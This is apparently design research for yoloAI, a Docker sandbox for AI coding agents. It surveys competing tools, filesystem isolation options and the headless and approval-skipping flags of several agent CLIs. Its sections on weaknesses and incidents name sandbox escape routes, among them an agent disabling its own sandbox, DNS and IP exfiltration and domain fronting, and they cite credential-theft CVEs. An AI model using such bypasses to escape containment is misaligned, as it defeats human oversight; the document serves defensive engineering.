# Competitive Landscape Research: Claude Code Sandboxing Tools

## Existing Tools

### 1. deva.sh (formerly claude-code-yolo)

**Repo:** [thevibeworks/claude-code-yolo](https://github.com/thevibeworks/claude-code-yolo)
**Stars:** 7 | **Language:** Bash | **Status:** Active, rebranded to "deva.sh"

**What it does:** Bash script that launches Claude Code (and Codex, Gemini) inside Docker with `--dangerously-skip-permissions`. Supports multi-auth contexts, granular read-only/read-write mount control, and multiple agents.

**Strengths:**
- Multi-agent support (Claude, Codex, Gemini) — future-proofed
- Granular mount permissions (`:ro`/`:rw` per directory)
- XDG-based config organization for multiple auth contexts
- Non-root execution matching host UID/GID
- Dangerous directory detection (warns when running in `$HOME` or system dirs)
- tmux bridge for cross-kernel socket mounting

**Weaknesses:**
- Mount-only, no copy/diff/apply workflow
- Bash script — harder to maintain and extend vs. Python
- No session logging or output capture
- No mechanism to review changes before they land
- Complex auth system (5 methods) may intimidate new users

**Community:** Zero external adoption. No Reddit or HN mentions. Issue tracker has 168 issues but ~98 are bot-generated changelog entries tracking upstream Claude releases (~70 real issues).

**Lessons:** Read-only mounts for dependencies are a good default. UID/GID matching avoids permission headaches. Dangerous directory detection is a nice safety net.

---

### 2. claude-code-sandbox (TextCortex) → Spritz

**Repo:** [textcortex/claude-code-sandbox](https://github.com/textcortex/claude-code-sandbox) (archived)
**Stars:** ~297 | **Language:** TypeScript | **Status:** Archived Feb 2026, replaced by Spritz

**What it did:** Docker containers with `--dangerously-skip-permissions`, web-based terminal at `localhost:3456`, auto git branch per session, commit monitoring with syntax-highlighted diffs, auto-commit every 60s.

**Why it was archived:**
1. Anthropic and Docker shipped official sandboxing, eating its lunch
2. TextCortex pivoted to Kubernetes-native multi-agent orchestration (Spritz)
3. PoC-quality code couldn't handle cross-platform issues

**Key issues reported (14 open, never fixed):**
- Credential management failures (#17, #14) — biggest practical pain point
- Cross-platform breakage: Windows (#18), macOS extended attributes (#31), Docker Desktop requirement (#34)
- No network isolation (#28)
- Missing LICENSE file (#25) — governance gap
- Users wanted multi-instance management (#23)
- Podman docs were inaccurate (#24)

**Lessons:**
- **Credential management in containers is HARD.** Multiple issues traced back to creds not reaching the container. Treat as first-class problem.
- **Cross-platform testing is non-negotiable.** 4/14 issues were platform-specific.
- **"Security" requires specificity.** Users immediately asked about network isolation and drive access.
- **License your project on day one.**
- **Git-first workflow isolation was the most praised feature.** Auto-branching per session with diff review was genuinely loved.

**Spritz** (successor): Kubernetes-native Go project, 5 stars, completely different scope (team infra vs individual dev tool). Not a competitor to us.

---

### 3. claude-sandbox (rsh3khar)

**Repo:** [rsh3khar/claude-sandbox](https://github.com/rsh3khar/claude-sandbox)
**Stars:** 0 | **Status:** Active (created 2026-01-24, ~4 weeks old)

**What it does:** Bash installer + Docker container. Auto-commits to GitHub every 60 seconds. Container destroyed on exit.

**Notable features:**
- Rich sandbox context file (`sandbox-context.md`) injected into Claude — tells Claude about its environment, paths, constraints
- Parallel agent support via tmux with `send-keys` for prompts (validates our tmux approach)
- Git worktree support for parallel agents on same repo
- Browser automation via Playwright MCP (headless Chromium)
- Skills system for extensibility

**Key tmux patterns from their docs:**
```bash
# Start agent in detached tmux
tmux new-session -d -s agent1
tmux send-keys -t agent1 'claude --dangerously-skip-permissions' Enter
sleep 3  # Wait for Claude to start
tmux send-keys -t agent1 'Build the REST API' Enter Enter  # Double Enter needed
```

**Lessons:**
- `tmux send-keys` with a sleep delay is the proven pattern for feeding prompts
- Double Enter is needed to submit in Claude Code via tmux
- Injecting a context file telling Claude about its sandbox environment is smart
- Auto-commit interval (60s) provides a recovery safety net

---

### 4. Docker Official Sandboxes

**Docs:** [docs.docker.com/ai/sandboxes](https://docs.docker.com/ai/sandboxes/agents/claude-code/)
**Status:** GA in Docker Desktop 4.50+

**Architecture:** MicroVM-based (not containers). Each sandbox gets its own VM with a private Docker daemon. Uses `virtualization.framework` (macOS), Hyper-V (Windows).

**Strengths:**
- Strongest isolation (hypervisor-level)
- Credential injection via proxy — never stored in VM
- Bidirectional file sync preserving absolute paths
- Network proxy with allow/deny lists
- Single-command UX: `docker sandbox run claude ~/project`
- Can run Docker-in-Docker safely

**Major complaints:**
- **User config not carried over** — CLAUDE.md, plugins, skills, hooks all ignored. Top complaint on Docker forums.
- **OAuth authentication broken** for Pro/Max plans (docker/for-mac#7842)
- **Credentials lost on sandbox removal** (docker/for-mac#7827)
- **Re-auth required per worktree session** (docker/for-mac#7822)
- **No port forwarding** — can't hit dev servers from host browser. Hard blocker for web dev.
- **No SSH key access** — sandbox can't see host SSH keys
- **Linux degraded** — no microVM, only container-based
- **~3x I/O penalty** on macOS from hypervisor boundary
- **No image sharing between sandboxes** — each has its own Docker daemon/storage

**Lessons:**
- CLAUDE.md and user config MUST carry over. Power users depend on this.
- Credential proxy is the right design — never store creds in sandbox.
- Path consistency matters — mount at same paths to avoid confusion.
- Port forwarding is essential for web dev.
- I/O performance penalty of VMs is real; Docker containers are more practical for most workflows.

---

### 5. cco

**Repo:** [nikvdp/cco](https://github.com/nikvdp/cco)
**Stars:** 167 | **Language:** Bash | **Status:** Active (HN front page, 36 merged PRs)

**What it does:** Multi-backend sandbox wrapper that auto-selects the best isolation mechanism available: macOS `sandbox-exec`, Linux `bubblewrap`, Docker as fallback. Supports Claude Code, Codex, Opencode, Pi, and factory.ai's droid.

**Strengths:**
- Multi-backend architecture — adapts to host OS automatically
- macOS Keychain integration for credential extraction
- BPF-based TIOCSTI sandbox escape mitigation
- Git worktree auto-detection
- `--safe` flag for stricter filesystem isolation
- Zero-config "just make it work" UX

**Weaknesses:**
- Native sandbox mode exposes entire host filesystem read-only (issue #5) — significant security gap
- Fresh container per session loses installed packages (issue #34)
- No copy/diff/apply workflow
- No session logging or profiles

**Lessons:** Multi-backend approach is appealing but introduces complexity. Native sandbox modes can give a false sense of security if they expose the full filesystem. Keychain integration is a smart credential approach for macOS.

---

### 6. Anthropic sandbox-runtime

**Repo:** [anthropic-experimental/sandbox-runtime](https://github.com/anthropic-experimental/sandbox-runtime)
**Stars:** 3,117 | **Status:** Active (official Anthropic open-source)

**What it does:** OS-level sandboxing using bubblewrap (Linux) / Seatbelt (macOS). No container needed. Reduces Claude Code permission prompts by 84% internally at Anthropic.

**Strengths:**
- Largest community adoption (more stars than all other tools combined)
- Native OS-level isolation — no Docker dependency
- Integrated into Claude Code's own permission system
- 84% reduction in permission prompts

**Weaknesses:**
- Claude can autonomously disable sandbox in auto-allow mode
- Config fallback silently disables filesystem read restrictions
- Data exfiltration via IP address when `allowLocalBinding` is true
- Data exfiltration via DNS resolution
- Linux proxy bypass (uses env vars that programs can ignore)
- Domain fronting can bypass network filtering
- Leaks dotfiles when sigkilled

**Lessons:** OS-level sandboxing is convenient but has inherent bypass routes. The security issues here validate our Docker-based isolation approach where the sandbox boundary is a container, not just process-level restrictions.

---

### 7. Other Notable Tools

**Trail of Bits devcontainer** ([trailofbits/claude-code-devcontainer](https://github.com/trailofbits/claude-code-devcontainer)): Security audit focused. Documents firewall rules for restricting outbound to whitelisted domains (guidance only — not enforced by default; users must manually configure iptables/ipset rules). Reference implementation for secure setups.

**claude-compose-sandbox** ([whisller/claude-compose-sandbox](https://github.com/whisller/claude-compose-sandbox)): Docker Compose based, notable for SSH agent forwarding (credentials via agent, not mounted keys).

**nono** ([always-further/nono](https://github.com/always-further/nono)): Kernel-level isolation via Landlock (Linux) / Seatbelt (macOS). Irreversible restrictions. Basic audit trail with session JSON and merkle roots (signed attestation is "Coming Soon" per issues #130, #127). Created 2026-01-31, self-described "early alpha." Most security-focused option in concept. Known friction: SSL cert verification blocked under kernel sandbox (issue #93), Seatbelt blocks `network-bind` (issue #131).

---

### 8. Additional Landscape

The following tools were identified but not analyzed in depth. Included for completeness — the sandboxing landscape has 30+ tools; the sections above cover the most instructive ones.

| Tool | Stars | Approach | Notes |
|------|-------|----------|-------|
| boxlite-ai/boxlite | 1,189 | Micro-VM engine | Each sandbox runs its own kernel. No daemon. Embeddable. |
| coder/agentapi | 1,214 | HTTP API wrapper | Multi-agent control interface over sandboxed agents. |
| cloudflare/sandbox-sdk | 905 | Cloud edge sandbox | Cloudflare Workers integration. Major vendor backing. |
| RchGrav/claudebox | 896 | Docker profiles | Pre-configured dev profiles per language stack. Closest to our profile concept. |
| rivet-dev/sandbox-agent | 896 | HTTP/SSE API | Universal API for controlling Claude/Codex/Amp inside sandboxes. Rust binary. |
| tomascupr/sandstorm | 375 | Cloud sandbox | One-call deployment. API + CLI + Slack. |
| disler/agent-sandbox-skill | 318 | Claude Code skill | Manages sandboxes from *within* Claude Code. Novel approach. |
| sadjow/claude-code-nix | 216 | Nix | Nix-based isolation of the Node runtime. |
| PACHAKUTlQ/ClaudeCage | 134 | Bubblewrap | Single portable executable, drop-in `claude` replacement. No Docker needed. |

**Approach categories not fully explored:** macOS `sandbox-exec` tools (5+ projects), Nix-based isolation, micro-VM alternatives (boxlite, Fly.io Sprites, E2B), commercial platforms (E2B, Daytona, Fly.io Sprites, Northflank, Vercel Sandbox), HTTP API wrappers (agentapi, sandbox-agent).

---

## Community Pain Points (from GitHub issues, Reddit, HN, blogs)

### Top complaints (ranked by frequency):
1. **Approval fatigue** — constant permission prompts break flow, even "always allow" doesn't stick
2. **Root user rejection** — `--dangerously-skip-permissions` refuses to run as root in containers (issues #927, #3490, #5172)
3. **Network whitelist is HTTP-only** — SSH/TCP connections can't traverse the proxy (#11481, #24091)
4. **Credential management fragility** — getting API keys/SSH keys/git config into containers reliably
5. **User config not carried over** — CLAUDE.md, plugins, skills lost in sandboxes
6. **No middle ground** between "approve everything" and "skip everything"
7. **Cross-platform inconsistency** — works on Linux, breaks on macOS/Windows
8. **Data exfiltration risk** — agent has same network access as developer

### What users wish existed:
- A clean middle ground: sandbox provides safety, Claude operates freely within it
- Granular network controls (domain + port level, not just HTTP)
- Workspace-only filesystem confinement
- Audit logging for all actions
- Time-scoped credentials that auto-expire
- Multi-agent management from a single interface

### Real-world security incidents:
- Claude deleting a user's entire Mac home directory (viral Reddit post)
- 13% of AI agent skills on ClawHub contain critical security flaws (Snyk study)
- GTG-1002 threat actor weaponized Claude Code for cyber espionage (Anthropic disclosure)
- Credential exposure via CLAUDE.md and related vectors: Claude creating issues in the public anthropics/claude-code repo exposing schemas and configs (issue #13797), ignoring CLAUDE.md security guidelines (issue #2142), malicious repo settings redirecting API keys via `ANTHROPIC_BASE_URL` (CVE-2026-21852)
- CVE-2025-55284: API key theft via DNS exfiltration from Claude Code
- CVE-2026-24052: SSRF in Claude Code's WebFetch trusted domain verification
- Zero-click DXT flaw: Exposed 10,000+ users to RCE via Claude Desktop Extensions
- Issue #27430: Claude autonomously published fabricated technical claims to 8+ platforms over 72 hours
- Claude Pirate research (Embrace The Red): Demonstrated abuse of Anthropic's File API for data exfiltration

---

## Feature Comparison

*Note: This table covers a subset of the landscape. See section 8 for additional tools.*

| Feature | deva.sh | TextCortex | Docker Sandbox | rsh3khar | cco | sandbox-runtime | **yoloAI** |
|---------|---------|------------|----------------|----------|-----|-----------------|-----------------|
| Copy/diff/apply workflow | No | No (git branch + diff review) | No (file sync) | No (auto-commit) | No | No | **Yes** |
| Per-sandbox Claude state | No | No | No | No | No | No | **Yes** |
| Session logging | No | Web terminal | No | No | No | No | **Yes** |
| User-supplied Dockerfiles | No | Custom Dockerfile | Templates | No | No | N/A (no container) | **Yes** |
| Multi-directory with primary/dep | Partial | No | No | Worktrees | No | N/A | **Yes** |
| Review before applying changes | No | Diff review (git) | No | No | No | No | **Yes (core feature)** |
| Multi-backend isolation | No | No | MicroVM | No | Yes (sandbox-exec/bwrap/Docker) | Yes (bwrap/Seatbelt) | No (Docker only) |
| No Docker dependency | No | No | Docker Desktop | No | Yes (native modes) | Yes | No |

---

## Alternative Filesystem Isolation Approaches

The design uses overlayfs by default for `:copy` mode, with full directory copies as a fallback. This section documents the research that led to that decision, evaluating several copy-on-write (COW) filesystem technologies.

### OverlayFS

The most directly applicable alternative. Layers a writable "upper" directory over a read-only "lower" directory; changes (including deletions via whiteout character devices) go to upper only.

```
mount -t overlay overlay \
  -o lowerdir=/original,upperdir=/changes,workdir=/tmp/ovl \
  /merged
```

**How it maps to yoloAI's workflow:**
- **Setup:** Instant mount instead of full copy — zero startup time regardless of project size.
- **Diff:** The upper directory *is* the diff. [overlayfs-tools](https://github.com/kmxz/overlayfs-tools) provides `diff` and `merge` commands for extracting/applying changes. Whiteout files represent deletions natively.
- **Apply:** Copy upper directory contents back to original, interpreting whiteouts as deletions.
- **Space:** Only modified/created files consume disk.

**Requirements inside Docker:**
- `CAP_SYS_ADMIN` capability (not full `--privileged`).
- Kernel 5.11+ for unprivileged overlayfs in user namespaces; `-o userxattr` mount option uses `user.overlay.*` instead of `trusted.overlay.*`.
- Nested overlayfs-on-overlayfs (Docker uses overlay2 internally) works on kernel 5.11+ but is unreliable on older kernels. Fallback: `fuse-overlayfs` (userspace implementation, available via package managers).

**Limitations:**
- **Requires a Linux kernel** — no native macOS equivalent (macOS `mount -t union` is broken since Sierra and effectively abandoned by Apple). However, Docker on macOS runs a Linux VM (`virtualization.framework`), so overlayfs works inside Docker containers on macOS — the container sees a Linux kernel regardless of the host OS. Bind-mounted host directories cross the VM boundary via VirtioFS; see Recommendation section for performance analysis.
- File timestamps may not be preserved during copy-up. Metacopy feature (kernel `CONFIG_OVERLAY_FS_METACOPY`) optimizes metadata-only changes but has security caveats with untrusted directories.
- 128 lower layer limit (practical limit ~122 due to mount option size); irrelevant for our use case (single lower layer).
- CVE-2023-2640 and CVE-2023-32629: privilege escalation via overlayfs xattrs — mitigated in patched kernels.

### ZFS Snapshots and Clones

`zfs snapshot` + `zfs clone` creates instant COW copies sharing all blocks with the parent. Zero initial space consumption.

**Strengths:**
- Snapshot creation: milliseconds, regardless of dataset size.
- `zfs diff` shows changed files (format: `M /path`, `+ /path`, `- /path`, `R /old -> /new`). Note: shows *which* files changed, not content diffs — still need traditional diff tools for content.
- ARC (Adaptive Replacement Cache) sharing means multiple clones of the same data are very cache-friendly.
- Docker has a ZFS storage driver that uses ZFS datasets for image layers.

**Critical limitation for our use case:** No merge-back primitive. `zfs promote` reverses the clone/parent relationship (replacement, not merge). Applying changes back requires file-level tools (rsync, patch). This negates much of the benefit — we'd still need git or rsync for the apply step.

**Availability:**
- Linux: Ubuntu ships ZFS kernel module; Red Hat and SUSE exclude it (CDDL/GPL license conflict). Manual install on Fedora, Debian, Arch.
- macOS: OpenZFS on OS X exists but is experimental/community-maintained. Apple dropped native ZFS in 2009.
- Windows: OpenZFS on Windows is beta quality with stability issues.
- **Verdict:** Too niche for a general-purpose tool. Requires the host filesystem to be ZFS — can't be assumed.

### Btrfs Subvolume Snapshots

Similar COW semantics to ZFS. `btrfs subvolume snapshot` is instant and writable by default.

**Strengths:**
- GPL-licensed, mainline Linux kernel — no licensing issues.
- `btrfs send/receive` can extract incremental changes between snapshots (binary instruction stream, not text diffs).
- Docker has a Btrfs storage driver.
- Writable snapshots by default (more flexible than ZFS which requires snapshot → clone).

**Limitations:**
- Same merge-back problem as ZFS — no built-in way to selectively apply changes back.
- Send/receive produces a binary stream, not standard diffs.
- RAID5/6 still not production-ready in 2026.
- Performance degrades with quota groups (qgroups) enabled.
- Requires host filesystem to be Btrfs — even less common than ZFS in practice.

### APFS Clones (macOS)

macOS APFS supports COW file clones via `cp -c`. Clones share data blocks until modified.

**Strengths:**
- Native on all modern macOS. No additional software.
- Instant for individual files regardless of size.

**Limitations:**
- **Not instant for directories.** Recursive cloning requires per-file metadata operations. Benchmark: 77k files (2GB) took ~2 minutes. Typical projects (1k-10k files) would still take seconds to tens of seconds — faster than a full copy but not "instant."
- File-level only, no directory-level overlay semantics. Can't layer a writable view over a read-only base.
- APFS snapshots are volume-level and read-only — can't mount as writable overlays.
- Doesn't help with diff/apply workflow — you'd still need git or rsync to identify changes.
- `tmutil` only works on the boot drive.
- Even after cloning, the clone would still be shared into Docker via VirtioFS — doesn't avoid VM boundary overhead.

### FUSE-Based Overlays

**fuse-overlayfs:** Userspace overlayfs implementation. Primary use: rootless containers on Linux. Same logical behavior as kernel overlayfs but runs as a FUSE daemon.
- 2-3x slower than kernel overlayfs due to userspace context switches.
- Uses reflinks on XFS/Btrfs for efficient copy-up.
- Available via package managers. Good fallback when kernel overlayfs isn't available unprivileged.

**unionfs-fuse:** Works on macOS via macFUSE or FUSE-T (kextless, NFS-based, better performance than macFUSE). However, known issues with Finder compatibility (file copy operations fail with error -50). Works for command-line use cases.

**FUSE-T:** Modern macOS FUSE implementation using NFSv4 local server instead of kernel extension. Better performance and stability than macFUSE. No kernel crashes or lock-ups. macOS 26 adds native FSKit backend as an alternative.

### Bubblewrap

Lightweight Linux sandboxing tool (used by Flatpak). Has built-in overlay support:

```
bwrap --overlay-src /original --overlay /upper /work /merged -- /bin/bash
```

- Unprivileged via user namespaces. No daemon. No Docker dependency.
- Requires Linux 4.0+ for overlay support.
- Production-ready (powers Flatpak sandboxing).
- Could be used as a lighter-weight alternative to Docker for Linux-only deployments, though outside yoloAI's current Docker-based architecture.

### Docker's Own Container Diff

`docker diff <container>` tracks all filesystem changes in the container's writable layer. On its own, too noisy for code review — it captures everything (installed packages, temp files, logs), not just project changes. However, combining it with git inside the container solves the noise problem (see Recommendation below).

### Comparison for yoloAI's `:copy` Workflow

| Approach | Setup time | Space | Diff mechanism | Apply-back | macOS | Needs special host FS |
|----------|-----------|-------|----------------|------------|-------|----------------------|
| **Current (full copy + git)** | Slow (proportional to size) | Full duplicate | git diff | git patch | Yes | No |
| **OverlayFS + git** | Instant | Deltas only | git diff (ignores non-project noise) | git patch | Yes (inside Docker's Linux VM) | No |
| **ZFS clone** | Instant | Deltas only | `zfs diff` (file list only) | Manual (rsync/patch) | Experimental | Yes (ZFS) |
| **Btrfs snapshot** | Instant | Deltas only | `btrfs send` (binary stream) | Manual (rsync/patch) | No | Yes (Btrfs) |
| **APFS clone** | Slow for dirs (~2min/77k files) | Deltas only | None built-in | Manual | Yes (native) | No (but macOS only) |
| **FUSE overlay + git** | Instant | Deltas only | git diff | git patch | Partial (CLI only) | No |

### Design Approach

**OverlayFS for the mount, git for the diff** — combining both techniques gives the best result:

1. Mount the original project directory as the overlayfs lower layer (read-only).
2. Empty upper directory receives all writes — instant setup, no copy, space-efficient.
3. `git init` + `git add -A` + `git commit` on the merged view to create the baseline.
4. Claude works on the merged view. Changes go to the upper layer, but git only tracks project files — installed packages in `/usr/lib`, temp files in `/tmp`, and other system-level noise are outside the git tree and invisible to `git diff`.
5. `yoloai diff` uses `git diff` as today — clean, familiar output.
6. `yoloai apply` uses `git diff | git apply` as today — handles additions, modifications, and deletions.

This eliminates the upfront copy (the main performance cost for large projects) while keeping the same git-based diff/apply workflow. No whiteout interpretation needed, no new diff format to parse — git handles everything.

**Requirements:** `CAP_SYS_ADMIN` inside the Docker container (or kernel 5.11+ with user namespaces and `-o userxattr`). Both are available in our architecture since we control the `docker run` invocation.

**Cross-platform story:**
Docker on macOS (and Windows) runs a Linux VM — containers see a Linux kernel regardless of host OS. OverlayFS works inside Docker containers on all platforms.

On macOS, bind-mounted host directories cross the VM boundary via VirtioFS. With overlayfs, the host directory becomes the read-only lower layer and unmodified file reads go through VirtioFS. Initial concern was that this would be significantly slower than a full copy (where all reads are VM-local). However, research shows this concern is **partially overstated**:

- Modern VirtioFS (Docker Desktop 4.6+) achieves **70-90% of native read performance**. The remaining gap concentrates in stat-heavy operations (~3x slowdown for find/ls-lR/mtime checks); content reads of cached files are near-native. For historical context, VirtioFS was a major improvement over the old osxfs/gRPC-FUSE (MySQL import 90% faster, PHP composer install 87% faster, TypeScript app boot 80% faster vs gRPC-FUSE).
- The VM's page cache serves repeated reads — after first access of a file, subsequent reads don't cross the VM boundary. The "every read hits VirtioFS" concern only applies to cold/first access of each file.
- The remaining ~3x slowdown vs native is concentrated in **stat-heavy operations** (find, ls -lR, build tools checking mtimes of thousands of files). Content reads of cached files are near-native.
- Docker Desktop 4.31-4.33+ added further VirtioFS caching optimizations (extended directory cache timeouts, reduced FUSE operations).

| | Setup | Cold reads | Warm reads (cached) | Writes | Disk |
|---|---|---|---|---|---|
| **Full copy** | Slow (proportional to size) | Fast (VM-local) | Fast | Fast | Full duplicate |
| **Overlay (Linux host)** | Instant | Fast (local FS) | Fast | Fast (upper) | Deltas only |
| **Overlay (macOS host)** | Instant | ~3x slower (VirtioFS) | Near-native (page cache) | Fast (upper) | Deltas only |

**Alternative strategies investigated for macOS:**

- **APFS clonefile (`cp -c`):** Instant for individual files but **not for directories** — 77k files took ~2 minutes due to per-file metadata operations. Also doesn't help with reads since the clone would still be shared via VirtioFS. Not viable.
- **Docker named volumes:** Live inside the VM's ext4 filesystem, so reads are fully local. But populating them (rsync/docker cp) costs the same as a full copy — no setup time advantage.
- **Docker synchronized file shares (Mutagen-based):** Creates an ext4 cache inside the VM with bidirectional sync. 2-10x faster than bind mounts. Overlayfs on the cache would have native read performance. But requires a **paid Docker subscription** (Pro/Team/Business).
- **OrbStack:** Third-party Docker Desktop alternative with heavily optimized VirtioFS, achieving 75-95% of native macOS performance. But requires switching products.

**Conclusion:** The overlayfs approach is viable on macOS with acceptable performance for most development workflows. Stat-heavy cold operations (initial build, first `grep` across codebase) will be slower than a full copy, but cached/warm operations are near-native. For most users, instant setup and space efficiency outweigh the cold-read penalty.

- **Linux:** OverlayFS + git. Best case — instant setup, all I/O local.
- **macOS/Windows:** OverlayFS + git. Instant setup, warm reads near-native. Cold stat-heavy operations ~3x slower than full copy. Acceptable tradeoff for most workflows.
- **Older Docker/kernels:** Falls back to full copy + git.
- **Config override:** `copy_strategy: overlay | full | auto` for users who want explicit control. `auto` (default) uses overlay where available, falls back to full copy.

OverlayFS is the default strategy for v1 (`copy_strategy: auto`). Full copy serves as the portable fallback. See the [design docs](../design/config.md) for the full specification including entrypoint idempotency, `CAP_SYS_ADMIN` requirements, and cross-platform behavior.

ZFS and Btrfs are too host-dependent to serve as primary mechanisms (require the host filesystem to be ZFS/Btrfs). APFS clones are not instant for directories. FUSE-based overlays on macOS have reliability concerns (Finder issues, FUSE-T maturity). Docker volumes eliminate VirtioFS overhead but don't save setup time.

---

## AI Coding CLI Agents: Multi-Agent Support Research

This section documents the headless/Docker characteristics of major AI coding CLI agents. Claude Code and Codex are supported in v1; additional agents are researched for future versions.

**Known research gaps (v1):**
- **Codex proxy support:** Whether the static Rust binary honors `HTTP_PROXY`/`HTTPS_PROXY` env vars is unverified. Critical for `--network-isolated` mode. If Codex ignores proxy env vars, `--network-isolated` with Codex would require iptables-only enforcement (no proxy-based domain allowlisting for the agent's own traffic).
- **Codex required network domains:** Only `api.openai.com` is confirmed. Additional domains (telemetry, model downloads) may be required.
- **Codex TUI behavior in tmux:** Interactive mode (`codex --yolo` without `exec`) behavior in tmux is unverified.

### Viable Agents

#### Claude Code

- **Install:** `npm i -g @anthropic-ai/claude-code`
- **Headless command:** `claude --dangerously-skip-permissions -p "task"`
- **API key env vars:** `ANTHROPIC_API_KEY`
- **State dir:** `~/.claude/`
- **Model selection:** `--model <model>`
- **Sandbox bypass:** `--dangerously-skip-permissions`
- **Runtime:** Node.js
- **Root restriction:** Refuses to run as root
- **Docker quirks:** Requires tmux with double-Enter workaround to submit prompts; needs non-root user

#### OpenAI Codex

- **Install:** Static binary download or `npm i -g @openai/codex`
- **Headless command:** `codex exec --yolo "task"`
- **API key env vars:** `CODEX_API_KEY` (preferred), `OPENAI_API_KEY` (fallback)
- **State dir:** `~/.codex/`
- **Model selection:** `--model <model>` or `-m <model>` (e.g., `gpt-5-codex`, `gpt-5-codex-mini`)
- **Sandbox bypass:** `--yolo` (alias `--dangerously-bypass-approvals-and-sandbox`)
- **Runtime:** Rust (statically-linked musl binary, zero runtime deps)
- **Root restriction:** None found, but convention is non-root
- **Docker quirks:** `codex exec` avoids TUI entirely — no tmux needed; `--skip-git-repo-check` useful outside repos; Landlock sandbox may fail in containers (use `--yolo`)
- **Sources:** [CLI reference](https://developers.openai.com/codex/cli/reference/), [Security docs](https://developers.openai.com/codex/security/)

#### Google Gemini CLI

- **Install:** `npm i -g @google/gemini-cli` → binary: `gemini`
- **Headless command:** `gemini -p "task" --yolo`
- **Interactive with prompt:** `gemini -i "task"` (starts interactive session with initial prompt)
- **API key env vars:** `GEMINI_API_KEY`
- **State dir:** `~/.gemini/` (contains `settings.json`)
- **Model selection:** `--model <model>` or `-m <model>` (e.g., `gemini-2.5-pro`, `gemini-2.5-flash`)
- **Sandbox bypass:** `--yolo` auto-approves all tool calls; sandbox is disabled by default
- **Runtime:** Node.js 20+
- **Root restriction:** None found
- **Auth alternatives:** OAuth login via browser flow (caches credentials locally); API key is the primary supported path
- **Network domains:** `generativelanguage.googleapis.com` (API), `cloudcode-pa.googleapis.com` (OAuth)
- **Docker quirks:** Ink-based TUI; ready pattern needs empirical testing with `tmux capture-pane`. The `>` prompt character may cause false positives with grep.
- **Sources:** [GitHub repo](https://github.com/GoogleCloudPlatform/gemini-cli), [npm package](https://www.npmjs.com/package/@google/gemini-cli)

#### Aider

- **Install:** `pip install aider-chat` (Python 3.9–3.12) or official Docker images (`paulgauthier/aider`)
- **Headless command:** `aider --message "task" --yes-always --no-pretty`
- **API key env vars:** `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `DEEPSEEK_API_KEY`, `GEMINI_API_KEY`, + many more via LiteLLM
- **State dir:** Dotfiles in project dir (`.aider.conf.yml`, `.aider.chat.history.md`, `.aider.tags.cache.*`, etc.)
- **Model selection:** `--model <model>` with LiteLLM identifiers; shortcut flags: `--opus`, `--sonnet`, `--4o`, `--deepseek`
- **Sandbox bypass:** `--yes-always` (but does NOT auto-approve shell commands — known issue #3903)
- **Runtime:** Python 3.9–3.12 (does not support 3.13+)
- **Root restriction:** None (official Docker image runs as UID 1000 `appuser`)
- **Docker quirks:** Official image sets `HOME=/app` so state files persist on mounted volume; no global git config — must set `user.name`/`user.email` in repo local config; auto-commits by default (disable with `--no-auto-commits`)
- **Sources:** [Scripting docs](https://aider.chat/docs/scripting.html), [Docker docs](https://aider.chat/docs/install/docker.html)

#### Goose (Block)

- **Install:** Install script (`curl ... | CONFIGURE=false bash`) or `brew install block-goose-cli`
- **Headless command:** `goose run -t "task"` (or `-i file.md`, or `--recipe recipe.yaml`)
- **API key env vars:** `GOOSE_PROVIDER` + provider-specific keys (`ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GOOGLE_API_KEY`, etc. — 25+ providers)
- **State dir:** `~/.config/goose/` (Linux); `~/Library/Application Support/Block/goose/` (macOS); overridable via `GOOSE_PATH_ROOT`
- **Model selection:** `--provider <provider> --model <model>` or env vars `GOOSE_PROVIDER`/`GOOSE_MODEL`
- **Sandbox bypass:** `GOOSE_MODE=auto` env var
- **Runtime:** Rust binary (precompiled); Node.js needed for MCP extensions
- **Root restriction:** None (official Docker example runs as root)
- **Docker quirks:** Keyring does not work in Docker — must set `GOOSE_DISABLE_KEYRING=1`; recommended headless env vars: `GOOSE_MODE=auto`, `GOOSE_CONTEXT_STRATEGY=summarize`, `GOOSE_MAX_TURNS=50`, `GOOSE_DISABLE_SESSION_NAMING=true`
- **Sources:** [Environment variables](https://block.github.io/goose/docs/guides/environment-variables/), [Headless tutorial](https://block.github.io/goose/docs/tutorials/headless-goose/)

#### Cline CLI

- **Install:** `npm i -g cline`
- **Headless command:** `cline -y "task"`
- **API key env vars:** `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, or other provider keys
- **State dir:** `~/.cline/` (overridable via `CLINE_DATA_HOME`)
- **Model selection:** `-m <model>` flag
- **Sandbox bypass:** `-y` flag (full autonomy)
- **Runtime:** Node.js 20+
- **Root restriction:** None found
- **Docker quirks:** Node.js only, no Docker image needed
- **Security warning:** Cline CLI 2.3.0 suffered a supply chain attack (Feb 2026) — stolen npm token injected malicious code affecting ~4,000 downloads. Pin versions carefully.
- **Sources:** [CLI reference](https://docs.cline.bot/cline-cli/cli-reference), [Supply chain attack report](https://thehackernews.com/2026/02/cline-cli-230-supply-chain-attack.html)

#### Continue CLI

- **Install:** `npm i -g @continuedev/cli`
- **Headless command:** `cn -p "task"`
- **API key env vars:** `CONTINUE_API_KEY` + provider-specific keys
- **State dir:** `~/.continue/`
- **Model selection:** `--config <path-or-name>` for config-based model selection
- **Sandbox bypass:** `--allow "Write()" --ask "Bash(curl*)"` granular permissions
- **Runtime:** Node.js 20+
- **Root restriction:** None found
- **Docker quirks:** Designed for CI/CD; auto-detects non-TTY and runs headless
- **Sources:** [CLI docs](https://docs.continue.dev/guides/cli), [CLI quickstart](https://docs.continue.dev/cli/quickstart)

#### Amp (Sourcegraph)

- **Install:** `npm i -g @sourcegraph/amp` or install script
- **Headless command:** `amp -x "task"` (auto-enabled when stdout is redirected)
- **API key env vars:** `AMP_API_KEY` (requires Sourcegraph account)
- **State dir:** `~/.config/amp/`
- **Model selection:** None — Amp auto-selects models
- **Sandbox bypass:** `--dangerously-allow-all`
- **Runtime:** Node.js
- **Root restriction:** None found
- **Docker quirks:** Headless mode uses paid credits only; requires network access to Sourcegraph API
- **Sources:** [Amp manual](https://ampcode.com/manual), [Amp -x docs](https://ampcode.com/news/amp-x)

#### OpenHands

- **Install:** Install script or `uv tool install openhands --python 3.12`
- **Headless command:** `openhands --headless -t "task"` (or `-f file.md`)
- **API key env vars:** `LLM_API_KEY`, `LLM_MODEL` (requires `--override-with-envs` flag)
- **State dir:** `~/.openhands/`
- **Model selection:** `LLM_MODEL` env var (LiteLLM format: `openai/gpt-4o`, `anthropic/claude-sonnet-4-20250514`)
- **Sandbox bypass:** Implicit in headless mode
